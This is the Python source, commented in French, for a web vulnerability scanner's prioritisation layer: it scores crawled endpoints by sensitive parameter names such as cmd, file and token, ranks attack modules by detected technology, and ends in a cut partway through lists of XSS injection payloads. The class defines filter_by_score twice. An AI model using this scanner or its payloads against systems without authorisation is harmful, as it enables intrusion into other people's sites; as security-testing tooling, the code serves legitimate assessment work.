"""
PhantomScan — Intelligence Layer  (v5.6)
=========================================
Résout le problème principal : les scanners de vulns testaient UNIQUEMENT
l'URL cible initiale et ignoraient tous les endpoints/forms découverts par
le crawler.

Ce module fournit :

1. EndpointBus
   Bus partagé écrit par le Crawler (et autres modules recon) et lu par
   les scanners de vulns. Permet d'élargir la surface d'attaque en temps
   réel pendant le scan.

   Structure des endpoints :
     {
       "url": str,            # URL complète
       "method": str,         # GET | POST | PUT ...
       "params": list[str],   # noms de paramètres connus
       "forms": list[dict],   # [{action, inputs, method}]
       "source": str,         # "crawler" | "js_analyzer" | ...
       "score": float,        # score d'intérêt 0-1
     }

2. TechPrioritizer
   Ajuste dynamiquement l'ordre d'exécution des modules vulns selon
   le fingerprint tech détecté (WordPress → LFI/upload prioritaires,
   Java/Spring → actuator/deserialization, etc.).

3. PostScanner mixin
   Utilisé par XSS/SQLi/LFI/SSRF pour tester également les endpoints
   POST découverts via le bus, pas juste l'URL GET initiale.
"""

from __future__ import annotations

import asyncio
import dataclasses
from dataclasses import dataclass, field
from typing import Any

from phantomscan.core.fingerprint import Fingerprint


# ─────────────────────────── Endpoint dataclass ─────────────────────────────

@dataclass
class DiscoveredEndpoint:
    url: str
    method: str = "GET"
    params: list[str] = field(default_factory=list)
    form_inputs: dict[str, str] = field(default_factory=dict)  # {name: default_val}
    source: str = ""
    score: float = 0.0


# ─────────────────────────── EndpointBus ────────────────────────────────────

class EndpointBus:
    """
    Bus thread-safe de partage d'endpoints entre modules.

    Le Crawler (et d'autres) publient() les endpoints découverts.
    Les scanners de vulns subscribe() pour les recevoir au fil de l'eau
    via une asyncio.Queue dédiée.

    Usage publisher:
        bus.publish(DiscoveredEndpoint(url=..., method="POST", params=[...]))

    Usage consumer (dans un scanner):
        async for ep in bus.iter_endpoints(timeout=0.5):
            yield self._test_endpoint(ep)
    """

    def __init__(self, maxsize: int = 2000) -> None:
        self._endpoints: list[DiscoveredEndpoint] = []
        self._lock = asyncio.Lock()
        self._queues: list[asyncio.Queue] = []
        self._closed = False
        self._seen_urls: set[str] = set()

    def create_subscription(self) -> asyncio.Queue:
        """Crée une queue abonnée : recevra tous les futurs endpoints publiés."""
        q: asyncio.Queue = asyncio.Queue(maxsize=500)
        self._queues.append(q)
        return q

    @staticmethod
    def _canonical_key(ep: "DiscoveredEndpoint") -> str:
        """
        v5.20 — Clé canonique : ignore les valeurs des params.
        /api?id=1 et /api?id=999 → même clé → un seul test.
        """
        from urllib.parse import urlparse, parse_qs
        p = urlparse(ep.url)
        path = p.path.rstrip("/") or "/"
        param_names = frozenset(parse_qs(p.query).keys()) | frozenset(ep.params or [])
        return f"{ep.method.upper()}:{p.netloc}{path}:{','.join(sorted(param_names))}"

    def publish(self, ep: DiscoveredEndpoint) -> None:
        """
        v5.20 — Publie un endpoint avec déduplication canonique.
        Si l'URL diffère par la valeur des params uniquement, on met à jour
        le score du record existant au lieu d'ajouter un doublon.
        """
        exact_key = f"{ep.method}:{ep.url}"
        canon_key  = self._canonical_key(ep)

        # Endpoint exactement identique déjà vu → skip
        if exact_key in self._seen_urls:
            return

        # v5.20 — Endpoint canoniquement équivalent déjà vu → merge score + params
        if canon_key in self._seen_urls:
            for existing in self._endpoints:
                if self._canonical_key(existing) == canon_key:
                    if ep.score > existing.score:
                        existing.score = ep.score
                    # Fusionner les params connus
                    new_params = list(set(existing.params or []) | set(ep.params or []))
                    existing.params = new_params
                    break
            self._seen_urls.add(exact_key)
            return

        self._seen_urls.add(exact_key)
        self._seen_urls.add(canon_key)
        # v5.13/v5.21 — Score composite : heuristique + boost selon param semantics
        if ep.score == 0.0:
            ep.score = score_endpoint(ep.url, ep.method, ep.params)

        # v5.21 — Boost si l'endpoint a des params hautement intéressants
        if ep.params:
            high_value_params = {
                "id", "user_id", "uid", "account_id", "file", "path", "url",
                "redirect", "token", "key", "cmd", "exec", "query", "search",
                "template", "callback", "host", "domain",
            }
            matching = {p.lower() for p in ep.params} & high_value_params
            if matching:
                ep.score = min(1.0, ep.score + 0.15 * len(matching))
        self._endpoints.append(ep)
        for q in self._queues:
            try:
                q.put_nowait(ep)
            except asyncio.QueueFull:
                pass  # slow consumer → skip

    def close(self) -> None:
        """Signale aux subscribers que plus aucun endpoint ne sera publié."""
        self._closed = True
        for q in self._queues:
            try:
                q.put_nowait(None)  # sentinel
            except asyncio.QueueFull:
                pass

    async def iter_endpoints(
        self,
        queue: asyncio.Queue,
        timeout: float = 2.0,
    ):
        """
        Itérateur asynchrone sur les endpoints de la queue.
        Retourne aussi les endpoints déjà collectés avant subscription.
        Termine quand la queue reçoit None (bus closed) ou timeout.
        """
        # D'abord yielder les endpoints déjà connus
        for ep in self._endpoints:
            yield ep

        # Puis attendre les nouveaux jusqu'à fermeture
        while True:
            try:
                ep = await asyncio.wait_for(queue.get(), timeout=timeout)
                if ep is None:
                    break
                yield ep
            except asyncio.TimeoutError:
                if self._closed:
                    break
                # Pas encore fermé → continuer à attendre
                continue

    @property
    def snapshot(self) -> list[DiscoveredEndpoint]:
        """v5.20 — Snapshot trié par score décroissant (endpoints les plus riches en premier)."""
        return sorted(self._endpoints, key=lambda e: -e.score)

    @property
    def size(self) -> int:
        """Nombre d'endpoints uniques dans le bus."""
        return len(self._endpoints)

    def filter_by_score(self, min_score: float = 0.5) -> list[DiscoveredEndpoint]:
        """v5.21 — Retourne uniquement les endpoints avec score ≥ min_score, triés par score."""
        return [e for e in self.snapshot if e.score >= min_score]

    def filter_by_params(self, *param_names: str) -> list[DiscoveredEndpoint]:
        """v5.21 — Retourne les endpoints ayant au moins un des params spécifiés."""
        target = {p.lower() for p in param_names}
        return [
            e for e in self.snapshot
            if any(p.lower() in target for p in (e.params or []))
        ]

    def filter_by_path_pattern(self, pattern: str) -> list[DiscoveredEndpoint]:
        """v5.21 — Retourne les endpoints dont l'URL matche le pattern regex."""
        import re
        rx = re.compile(pattern, re.I)
        return [e for e in self.snapshot if rx.search(e.url)]

    def filter_by_score(self, min_score: float) -> list[DiscoveredEndpoint]:
        """
        Retourne uniquement les endpoints dont le score ≥ min_score.
        Utile pour les modules lents (deserialization, cmdi) qui ne doivent
        tester que les endpoints à fort potentiel.
        """
        return [ep for ep in self._endpoints if ep.score >= min_score]

    def top_endpoints(self, n: int = 20) -> list[DiscoveredEndpoint]:
        """
        Retourne les N endpoints les mieux scorés.
        Pratique pour les phases de scan rapide (--fast mode).
        """
        return sorted(self._endpoints, key=lambda ep: ep.score, reverse=True)[:n]

    def __len__(self) -> int:
        return len(self._endpoints)


# ─────────────────────────── TechPrioritizer ────────────────────────────────

# Mapping tech → attributs ScanConfig à booster en priorité
# Format : (tech_substr_lower, boosted_attrs, disabled_attrs)
import re as _re  # noqa: E402 — import local pour les patterns de params

_TECH_RULES: list[tuple[str, list[str], list[str]]] = [
    # CMS PHP
    ("wordpress",    ["lfi", "file_upload", "sqli", "xss"],           []),
    ("joomla",       ["lfi", "file_upload", "sqli"],                   []),
    ("drupal",       ["lfi", "sqli", "xxe"],                           []),
    ("magento",      ["sqli", "ssrf", "xxe"],                          []),
    # Langages backend
    ("php",          ["lfi", "xxe", "ssti"],                           []),
    ("java",         ["deserialization", "actuator", "xxe", "ssti"],   []),
    ("asp.net",      ["deserialization", "ssti", "sqli"],              []),
    ("ruby",         ["ssti", "deserialization"],                      []),
    ("rails",        ["ssti", "deserialization", "sqli"],              []),
    ("node.js",      ["ssti", "prototype_pollution", "ssrf"],          []),
    ("django",       ["ssti", "sqli"],                                 []),
    ("golang",       ["ssrf", "ssti"],                                 []),
    ("python",       ["ssti", "deserialization"],                      []),
    # Cloud / infra
    ("aws",          ["ssrf", "s3_enum"],                              []),
    ("cloudfront",   ["cache_poison"],                                 []),
    ("shopify",      ["ssrf", "cors"],                                 []),
    ("azure",        ["ssrf", "subdomain_takeover"],                   []),
    ("gcp",          ["ssrf", "s3_enum"],                              []),
    # Serveurs web / proxies
    ("nginx",        ["http_smuggling", "cache_poison", "lfi"],        []),
    ("apache",       ["http_smuggling", "lfi", "path_traversal"],      []),
    ("iis",          ["path_traversal", "deserialization", "ssti"],    []),
    ("tomcat",       ["deserialization", "lfi", "actuator"],           []),
    ("haproxy",      ["http_smuggling"],                               []),
    ("varnish",      ["cache_poison"],                                 []),
    # Cache / bases de données non-relationnelles
    ("redis",        ["ssrf"],                                         []),
    ("memcached",    ["ssrf"],                                         []),
    ("elasticsearch",["ssrf", "idor"],                                 []),
    ("cassandra",    ["nosql_injection"],                              []),
    ("neo4j",        ["nosql_injection"],                              []),
    # GraphQL
    ("graphql",      ["graphql_injection"],                            []),
    ("hasura",       ["graphql_injection", "idor"],                    []),
    ("apollo",       ["graphql_injection"],                            []),
    # NoSQL DBs
    ("mongodb",      ["nosql_injection"],                              []),
    ("mongoose",     ["nosql_injection"],                              []),
    ("couchdb",      ["nosql_injection"],                              []),
    ("firebase",     ["nosql_injection", "cors"],                      []),
    ("dynamodb",     ["nosql_injection"],                              []),
    ("supabase",     ["nosql_injection", "cors", "idor"],              []),
    # API Frameworks (expose souvent des specs)
    ("swagger",      ["open_api_recon"],                               []),
    # Cloud providers (Subdomain Takeover)
    ("heroku",       ["subdomain_takeover"],                           []),
    ("netlify",      ["subdomain_takeover"],                           []),
    ("vercel",       ["subdomain_takeover"],                           []),
    ("github pages", ["subdomain_takeover"],                           []),
    ("render",       ["subdomain_takeover"],                           []),
    ("fly.io",       ["subdomain_takeover"],                           []),
    # Auth / IAM / 2FA
    ("totp",         ["otp_bypass"],                                   []),
    ("2fa",          ["otp_bypass"],                                   []),
    ("mfa",          ["otp_bypass"],                                   []),
    ("keycloak",     ["oauth_misconfig", "otp_bypass"],                []),
    ("auth0",        ["oauth_misconfig", "jwt"],                       []),
    ("okta",         ["oauth_misconfig", "jwt"],                       []),
    ("cognito",      ["oauth_misconfig", "jwt"],                       []),
    # API frameworks
    ("openapi",      ["open_api_recon"],                               []),
    ("fastapi",      ["open_api_recon", "nosql_injection"],            []),
    ("flask",        ["open_api_recon", "ssti"],                       []),
    ("express",      ["open_api_recon", "prototype_pollution"],        []),
    ("spring boot",  ["open_api_recon", "actuator"],                   []),
    ("laravel",      ["open_api_recon", "sqli"],                       []),
    ("nestjs",       ["prototype_pollution", "ssrf"],                  []),
    ("strapi",       ["idor", "sqli", "ssrf"],                         []),
    ("graphene",     ["graphql_injection"],                            []),
    # Container / orchestration
    ("kubernetes",   ["ssrf"],                                         []),
    ("k8s",          ["ssrf"],                                         []),
    ("docker",       ["ssrf", "path_traversal"],                       []),
    # Monitoring / observability
    ("grafana",      ["ssrf", "idor"],                                 []),
    ("prometheus",   ["ssrf"],                                         []),
    ("kibana",       ["ssrf", "idor"],                                 []),
    ("jenkins",      ["ssrf", "lfi", "cmdi"],                          []),
]

# Paramètres à fort potentiel d'exploitation — score l'intérêt d'un endpoint
_SENSITIVE_PARAM_PATTERNS: list[tuple[_re.Pattern, float]] = [
    # RCE / injection de commandes
    (_re.compile(r"^(cmd|exec|command|run|shell|ping|system|eval|execute|proc|process)$", _re.I), 1.0),
    # LFI / Path traversal
    (_re.compile(r"^(file|path|filename|filepath|include|load|page|template|view|doc|document|module|plugin)$", _re.I), 0.9),
    # SSRF
    (_re.compile(r"^(url|uri|endpoint|src|source|host|dest(?:ination)?|target|proxy|fetch|callback|webhook|import|export|remote|service|api[-_]?url)$", _re.I), 0.9),
    # SQL injection
    (_re.compile(r"^(id|uid|order|sort|filter|q|query|search|where|limit|offset|field|column|table|from|select)$", _re.I), 0.7),
    # IDOR — identifiants d'objets
    (_re.compile(r"^(account|user|profile|member|customer|order|invoice|ticket|record|item|entity|object|document|resource)[-_]?id$", _re.I), 0.85),
    (_re.compile(r"^(uid|uuid|pid|rid|eid|oid|tid|bid|cid)$", _re.I), 0.8),
    # Auth / tokens
    (_re.compile(r"^(token|key|api[-_]?key|secret|auth|access[-_]?token|refresh[-_]?token|jwt|session|password|pass|passwd|credential|otp|code|nonce)$", _re.I), 0.9),
    # Open redirect
    (_re.compile(r"^(redirect|return|next|goto|redir|continue|forward|back|returnUrl|redirectUrl|to|dest)$", _re.I), 0.75),
    # Upload / parsing
    (_re.compile(r"^(upload|attachment|content|data|payload|body|input|raw|xml|json|base64|encoded|format)$", _re.I), 0.65),
    # Business logic
    (_re.compile(r"^(price|amount|qty|quantity|total|discount|coupon|promo|balance|credit|cost|fee)$", _re.I), 0.75),
    # Admin/debug
    (_re.compile(r"^(debug|test|admin|dev|internal|override|bypass|skip|force|sudo)$", _re.I), 0.8),
]

# Chemins à fort potentiel bug bounty — bonus de score sur le path
_HIGH_VALUE_PATH_PATTERNS: list[tuple[_re.Pattern, float]] = [
    # Auth / account takeover
    (_re.compile(r"/(login|signin|signup|register|auth|oauth|sso|saml|forgot[-_]?password|reset[-_]?password|verify|2fa|mfa|otp)", _re.I), 0.85),
    # Admin panels
    (_re.compile(r"/(admin|administrator|manage|dashboard|control[-_]?panel|superuser|staff|backoffice|cms)", _re.I), 0.9),
    # API endpoints
    (_re.compile(r"/(api|v\d+|graphql|rest|rpc|endpoint|service|soap|wsdl)", _re.I), 0.8),
    # File / upload
    (_re.compile(r"/(upload|file|attachment|import|export|document|media|asset|static|download|storage)", _re.I), 0.8),
    # Financial / transactions
    (_re.compile(r"/(payment|checkout|order|invoice|transfer|withdraw|deposit|wallet|balance|billing|subscription)", _re.I), 0.85),
    # User data
    (_re.compile(r"/(profile|account|user|member|settings|preference|personal|private|my[-_])", _re.I), 0.75),
    # Config / secrets
    (_re.compile(r"/(config|conf|\.env|settings|secret|private|backup|debug|test|dev|staging|internal|\.git|\.svn)", _re.I), 0.95),
    # SSRF-prone
    (_re.compile(r"/(proxy|fetch|request|forward|redirect|relay|gateway|outbound)", _re.I), 0.85),
]


def score_endpoint(url: str, method: str, params: list[str]) -> float:
    """
    v5.13 — Score composite d'un endpoint pour le bug bounty.
    Combine la sensibilité des paramètres, la valeur du path,
    et la méthode HTTP pour prioriser les endpoints à tester.

    Retourne un score 0.0–1.0.
    """
    from urllib.parse import urlparse
    path = urlparse(url).path.lower()

    # Score base : paramètres
    param_score = score_param_sensitivity(params)

    # Score path : présence de patterns à fort enjeu
    path_score = 0.0
    for pattern, weight in _HIGH_VALUE_PATH_PATTERNS:
        if pattern.search(path):
            path_score = max(path_score, weight)

    # Bonus POST/PUT/PATCH : état mutable → plus intéressant
    method_bonus = 0.1 if method.upper() in ("POST", "PUT", "PATCH", "DELETE") else 0.0

    # Bonus si beaucoup de paramètres (surface d'attaque large)
    param_count_bonus = min(0.15, len(params) * 0.03)

    # Agrégation : max(param, path) + bonuses
    base = max(param_score, path_score)
    final = min(1.0, base + method_bonus + param_count_bonus)

    # Minimum 0.1 pour les endpoints sans params ni path reconnu
    return max(0.1, final)


def score_param_sensitivity(params: list[str]) -> float:
    """
    Retourne un score 0.0–1.0 estimant le potentiel d'exploitation
    d'un endpoint basé sur les noms de ses paramètres.

    Utilisé par CrawlerBridge pour scorer les endpoints publiés sur le bus,
    et par les modules pour prioriser leurs tests.

    Ex: ['file', 'cmd'] → 0.95  |  ['page', 'lang'] → 0.35
    """
    if not params:
        return 0.1
    max_score = 0.0
    for param in params:
        for pattern, weight in _SENSITIVE_PARAM_PATTERNS:
            if pattern.match(param):
                max_score = max(max_score, weight)
                break
    # Bonus si ≥2 paramètres sensibles (surface d'attaque élargie)
    sensitive_count = sum(
        1 for p in params
        if any(pat.match(p) for pat, _ in _SENSITIVE_PARAM_PATTERNS)
    )
    if sensitive_count >= 2:
        max_score = min(1.0, max_score + 0.15)
    return max_score if max_score > 0 else 0.15

# Mapping CMS fingerprint
_CMS_RULES: dict[str, list[str]] = {
    "WordPress":  ["lfi", "file_upload", "sqli", "xss", "ssrf"],
    "Joomla":     ["lfi", "file_upload", "sqli"],
    "Drupal":     ["lfi", "sqli", "xxe"],
    "Magento":    ["sqli", "ssrf", "xxe", "ssti"],
    "Ghost":      ["ssrf", "ssti"],
    "Shopify":    ["ssrf", "cors"],
}


class TechPrioritizer:
    """
    Ré-ordonne et ajuste dynamiquement les modules vulns selon le fingerprint.

    Retourne une liste ordonnée d'attributs ScanConfig dans l'ordre
    de priorité recommandé pour la cible.
    """

    DEFAULT_ORDER: list[str] = [
        "headers_injection", "crlf", "open_redirect", "auth_bypass",
        "xss", "sqli", "lfi", "ssrf", "ssti", "cmdi", "xxe",
        "idor", "cache_poison", "prototype_pollution",
        "file_upload", "graphql_injection", "jwt",
        "actuator", "http_smuggling", "deserialization",
        "s3_enum", "waf_fingerprint", "oauth_misconfig",
        "path_traversal", "log4shell", "tls_audit", "rate_limit",
        "cors", "forbidden_bypass",
        "nosql_injection", "open_api_recon",
        "subdomain_takeover", "otp_bypass",
    ]

    def __init__(self) -> None:
        # v5.20 — Modules boostés dynamiquement par les findings du scan en cours
        self._runtime_boost: dict[str, float] = {}  # module → score de boost cumulé

    def record_finding(self, module: str, severity: str) -> None:
        """
        v5.20 — Appelé par l'Engine quand un finding est confirmé.
        Booste les modules apparentés pour les prochains endpoints.
        """
        sev_weight = {"CRITICAL": 1.0, "HIGH": 0.7, "MEDIUM": 0.4, "LOW": 0.2}.get(severity, 0.3)
        # Booster les modules de la même famille (via PROPAGATION_RULES)
        for src, targets, bonus in AdaptiveScorer._PROPAGATION_RULES:
            if src in module.lower():
                for target in targets:
                    self._runtime_boost[target] = (
                        self._runtime_boost.get(target, 0) + bonus * sev_weight
                    )

    def prioritize(self, fp: Fingerprint | None) -> list[str]:
        """
        v5.20 — Retourne les modules ordonnés par priorité.
        Combine le fingerprint statique ET les boosts dynamiques des findings.
        Les modules boosted dynamiquement passent devant les modules statiques.
        """
        if fp is None:
            return list(self.DEFAULT_ORDER)

        boosted: set[str] = set()

        # Règles par technologie
        for tech_sub, boost_attrs, _ in _TECH_RULES:
            all_techs = " ".join(fp.technologies).lower()
            if fp.cms:
                all_techs += " " + fp.cms.lower()
            if tech_sub in all_techs:
                boosted.update(boost_attrs)

        # Règles par CMS
        if fp.cms and fp.cms in _CMS_RULES:
            boosted.update(_CMS_RULES[fp.cms])

        # Subdomain Takeover prioritaire si cloud provider dans les techs
        cloud_techs = ("heroku", "netlify", "vercel", "github", "azure", "aws", "gcp", "cloudflare")
        if any(t in " ".join(fp.technologies).lower() for t in cloud_techs):
            boosted.add("subdomain_takeover")

        # OTP Bypass prioritaire si 2FA / auth dans les techs
        auth_techs = ("totp", "2fa", "mfa", "authy", "otp")
        if any(t in " ".join(fp.technologies).lower() for t in auth_techs):
            boosted.add("otp_bypass")

        # NoSQL Injection prioritaire si MongoDB / NoSQL détecté
        if any(t in " ".join(fp.technologies).lower() for t in ("mongo", "nosql", "couchdb", "firebase", "dynamo")):
            boosted.add("nosql_injection")

        # OpenAPI recon prioritaire si framework API détecté
        if any(t in " ".join(fp.technologies).lower() for t in ("swagger", "openapi", "fastapi", "springdoc")):
            boosted.add("open_api_recon")

        # Log4Shell prioritaire si Java détecté
        if any("java" in t.lower() or "spring" in t.lower() for t in fp.technologies):
            boosted.add("log4shell")
            boosted.add("actuator")

        # TLS audit toujours en dernier (ne dépend pas du fingerprint)
        order = list(self.DEFAULT_ORDER)
        tls = "tls_audit"
        if tls in order:
            order.remove(tls)

        # Mettre les boosted en tête
        boosted_ordered = [m for m in self.DEFAULT_ORDER if m in boosted]
        rest = [m for m in order if m not in boosted]
        base_order = boosted_ordered + rest + ([tls] if tls in self.DEFAULT_ORDER else [])

        # v5.20 — Appliquer les boosts dynamiques (findings en cours de scan)
        if self._runtime_boost:
            def sort_key(m: str) -> tuple:
                pos = base_order.index(m) if m in base_order else 999
                dynamic_boost = -self._runtime_boost.get(m, 0)
                return (dynamic_boost, pos)
            return sorted(base_order, key=sort_key)
        return base_order


# ─────────────────────────── CrawlerBridge ──────────────────────────────────

class CrawlerBridge:
    """
    Adapte les Findings du Crawler vers des DiscoveredEndpoints pour le bus.

    Le Crawler yield des Findings avec title "Form découvert (POST)" et
    evidence contenant les params. CrawlerBridge parsese ces findings et
    les publie sur le bus.
    """

    def __init__(self, bus: EndpointBus) -> None:
        self._bus = bus

    def ingest_finding(self, finding: Any) -> None:
        """
        Appeler avec chaque Finding du Crawler.
        Publie sur le bus si c'est un endpoint exploitable.
        """
        from phantomscan.output.reporter import Finding, Severity

        title = finding.title.lower()
        url = finding.url

        # Forms découverts
        if "form" in title or "candidat injection" in title:
            method = "POST" if "post" in title else "GET"
            params = self._parse_params_from_evidence(finding.evidence)
            score = 0.7 if method == "POST" else 0.3
            self._bus.publish(DiscoveredEndpoint(
                url=url,
                method=method,
                params=params,
                source="crawler/form",
                score=score,
            ))

        # URLs avec params intéressants (high risk score)
        elif finding.severity in (Severity.HIGH, Severity.MEDIUM):
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())
            if params:
                self._bus.publish(DiscoveredEndpoint(
                    url=url,
                    method="GET",
                    params=params,
                    source="crawler/interesting",
                    score=0.8 if finding.severity == Severity.HIGH else 0.5,
                ))

        # API endpoints découverts dans le JS
        elif "api" in title or "ajax" in title or "endpoint" in title:
            self._bus.publish(DiscoveredEndpoint(
                url=url,
                method="GET",
                params=[],
                source="crawler/api",
                score=0.6,
            ))

    def ingest_url(self, url: str, method: str = "GET", params: list[str] | None = None) -> None:
        """Publier directement une URL avec ses params — score calculé via param sensitivity."""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        discovered_params = params or list(parse_qs(parsed.query).keys())
        if discovered_params or method == "POST":
            param_score = score_param_sensitivity(discovered_params)
            self._bus.publish(DiscoveredEndpoint(
                url=url,
                method=method,
                params=discovered_params,
                source="direct",
                score=param_score,
            ))

    @staticmethod
    def _parse_params_from_evidence(evidence: str) -> list[str]:
        """Extrait les noms de params depuis l'evidence string du Crawler."""
        import re
        # "Params: ['name', 'email', 'message']" ou "Champs: ['q']"
        m = re.search(r"\[([^\]]+)\]", evidence)
        if not m:
            return []
        raw = m.group(1)
        params = [p.strip().strip("\"'") for p in raw.split(",")]
        return [p for p in params if p]


# ─────────────────────────── AdaptiveScorer ─────────────────────────────────

class AdaptiveScorer:
    """
    v5.11 — Re-score dynamique des endpoints en temps réel selon les findings
    déjà découverts pendant le scan.

    Logique :
      - Un finding SQLi sur /api/users → boost de tous les endpoints /api/*
        pour les modules sqli/nosql_injection/ssti
      - Un finding SSRF → boost des endpoints avec params url/src/host
      - Un finding IDOR → boost des autres endpoints du même pattern de chemin
      - Un finding auth_bypass → boost IDOR sur tous les endpoints de la même ressource

    Usage dans l'engine :
        scorer = AdaptiveScorer(bus)
        scorer.ingest_finding(finding)        # appelé après chaque finding
        priorities = scorer.boost_modules(ep) # liste de modules à prioritiser sur cet endpoint
    """

    # Règles : (module_source, modules_à_booster, bonus_score)
    _PROPAGATION_RULES: list[tuple[str, list[str], float]] = [
        ("sqli",              ["sqli", "nosql_injection", "ssti"],       0.3),
        ("nosql_injection",   ["sqli", "nosql_injection"],               0.3),
        ("ssrf",              ["ssrf", "s3_enum", "lfi"],                0.35),
        ("lfi",               ["lfi", "path_traversal", "ssrf"],         0.3),
        ("idor",              ["idor", "bola", "auth_bypass"],           0.4),
        ("auth_bypass",       ["idor", "oauth_misconfig", "jwt"],        0.35),
        ("xss",               ["xss", "dom_xss", "ssti"],                0.2),
        ("ssti",              ["ssti", "cmdi", "deserialization"],        0.4),
        ("cmdi",              ["cmdi", "ssti", "lfi"],                   0.45),
        ("cors",              ["cors", "oauth_misconfig", "csrf"],        0.25),
        ("jwt",               ["jwt", "jwt_advanced", "auth_bypass"],    0.3),
        ("prototype_pollution",["prototype_pollution", "xss", "ssti"],   0.3),
        ("oauth_misconfig",   ["oauth_misconfig", "jwt", "cors"],        0.3),
        # v5.21 — Nouvelles règles de propagation
        ("account_takeover",  ["account_takeover", "idor", "auth_bypass"], 0.5),
        ("xpath_injection",   ["xpath_injection", "sqli", "nosql_injection"], 0.4),
        ("email_injection",   ["email_injection", "crlf", "host_header_injection"], 0.35),
        ("api_versioning",    ["api_versioning", "idor", "auth_bypass"],   0.4),
        ("file_upload",       ["file_upload", "cmdi", "ssrf"],             0.5),
        ("deserialization",   ["deserialization", "cmdi", "ssrf"],         0.5),
        ("http_smuggling",    ["http_smuggling", "cache_poison", "idor"],  0.45),
        ("graphql_injection", ["graphql_injection", "sqli", "idor"],       0.4),
        ("race_condition",    ["race_condition", "idor", "business_logic"], 0.35),
    ]

    def __init__(self, bus: EndpointBus) -> None:
        self._bus = bus
        # module → set de prefixes de chemin où une vuln a été trouvée
        self._vuln_paths: dict[str, set[str]] = {}
        # module → set de param names vulnérables découverts
        self._vuln_params: dict[str, set[str]] = {}

    def ingest_finding(self, finding: Any, prioritizer: "TechPrioritizer | None" = None) -> None:
        """
        v5.20 — Appelé après chaque finding.
        Met à jour les tables internes, re-score le bus,
        ET notifie le TechPrioritizer pour le reordering dynamique.
        """
        from urllib.parse import urlparse
        module = finding.module.split("/")[-1]  # "vulns/sqli" → "sqli"
        # v5.20 — Notifier le TechPrioritizer
        if prioritizer is not None:
            sev = finding.severity.value if hasattr(finding.severity, "value") else str(finding.severity)
            prioritizer.record_finding(module, sev)
        parsed = urlparse(finding.url)

        # Extraire le préfixe de chemin (2 segments max)
        path_parts = [p for p in parsed.path.split("/") if p]
        path_prefix = "/" + "/".join(path_parts[:2]) if path_parts else "/"

        self._vuln_paths.setdefault(module, set()).add(path_prefix)

        # Extraire les params depuis l'evidence si disponible
        if finding.evidence:
            import re
            for m in re.finditer(r'`([a-zA-Z_][a-zA-Z0-9_-]{0,30})`', finding.evidence):
                self._vuln_params.setdefault(module, set()).add(m.group(1).lower())

        # Re-scorer les endpoints du bus
        self._rescore_bus(module, path_prefix)

    def _rescore_bus(self, trigger_module: str, vuln_path: str) -> None:
        """Boost les endpoints du bus liés au module qui vient de trouver une vuln."""
        boosted_modules = self._get_boosted_modules(trigger_module)
        if not boosted_modules:
            return

        for ep in self._bus.snapshot:
            from urllib.parse import urlparse
            ep_parts = [p for p in urlparse(ep.url).path.split("/") if p]
            ep_prefix = "/" + "/".join(ep_parts[:2]) if ep_parts else "/"

            # Même préfixe de chemin → boost
            if ep_prefix == vuln_path or vuln_path.startswith(ep_prefix):
                bonus = self._get_bonus(trigger_module)
                ep.score = min(1.0, ep.score + bonus)

    def boost_modules(self, ep: DiscoveredEndpoint) -> list[str]:
        """
        Retourne la liste des modules à prioriser pour cet endpoint,
        en tenant compte des vulns déjà trouvées sur des endpoints similaires.
        """
        from urllib.parse import urlparse
        ep_parts = [p for p in urlparse(ep.url).path.split("/") if p]
        ep_prefix = "/" + "/".join(ep_parts[:2]) if ep_parts else "/"

        boosted: set[str] = set()

        for module, paths in self._vuln_paths.items():
            for vpath in paths:
                if ep_prefix == vpath or vpath.startswith(ep_prefix):
                    boosted.update(self._get_boosted_modules(module))

        # Boost aussi par param overlap
        ep_params_lower = {p.lower() for p in ep.params}
        for module, vuln_params in self._vuln_params.items():
            if ep_params_lower & vuln_params:
                boosted.update(self._get_boosted_modules(module))

        return sorted(boosted)

    def _get_boosted_modules(self, trigger: str) -> list[str]:
        for src, modules, _ in self._PROPAGATION_RULES:
            if src == trigger:
                return modules
        return []

    def _get_bonus(self, trigger: str) -> float:
        for src, _, bonus in self._PROPAGATION_RULES:
            if src == trigger:
                return bonus
        return 0.2


# ═══════════════════════════════════════════════════════════════════════════════
# v5.17 — Intelligence améliorée
# ═══════════════════════════════════════════════════════════════════════════════

# ─────────────────────────── ContextualMutator ──────────────────────────────

class _InjectionContext:
    """Représente le contexte d'injection d'un paramètre."""
    JSON_VALUE   = "json_value"
    XML_NODE     = "xml_node"
    HTML_ATTR    = "html_attr"
    HEADER_VALUE = "header_value"
    PATH_SEGMENT = "path_segment"
    QUERY_PARAM  = "query_param"
    COOKIE       = "cookie"
    UNKNOWN      = "unknown"


class ContextualMutator:
    """
    v5.17 — Génère des mutations de payloads adaptées au contexte de réflexion.

    Au lieu d'utiliser des payloads génériques partout, inspecte la réponse
    baseline pour déduire OÙ la valeur injectée est réfléchie (JSON body,
    attribut HTML, header HTTP, segment de path, cookie...) puis génère
    des variantes optimisées pour ce contexte précis.

    Exemple :
        >>> mutator = ContextualMutator()
        >>> ctx = mutator.detect_context(response_body, "test123", content_type="application/json")
        >>> payloads = mutator.mutate("test123", ctx, vuln_type="xss")
        # → payloads spécifiques JSON-breakout + XSS sans guillemets HTML

    Utilisation dans les modules :
        probe_resp = await req.get(url, params={"q": sentinel})
        ctx = mutator.detect_context(probe_resp.body, sentinel, probe_resp.content_type)
        for payload in mutator.mutate(sentinel, ctx, "sqli"):
            ...
    """

    # Sentinel universel — valeur innocente facile à retrouver dans la réponse
    SENTINEL = "ph4nt0m_s3nt1nel"

    # ── Payloads XSS par contexte ──────────────────────────────────────────────
    _XSS_PAYLOADS: dict[str, list[str]] = {
        _InjectionContext.JSON_VALUE: [
            # Breakout de chaîne JSON + script
            '","xss":"<script>alert(1)</script>',
            '\\"}<script>alert(1)</script>',
            # Sans quote — injection dans valeur directe
            "<img src=x onerror=alert(1)>",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # Unicode escape
        ],
        _InjectionContext.HTML_ATTR: [
            '" onmouseover="alert(1)',
            "' onmouseover='alert(1)",
            '" autofocus onfocus="alert(1)',
            "javascript:alert(1)",
            '" src="x" onerror="alert(1)',
        ],
        _InjectionContext.PATH_SEGMENT: [
            "<script>alert(1)</script>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "..%2F<script>alert(1)</script>",
        ],
        _InjectionContext.QUERY_PARAM: [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
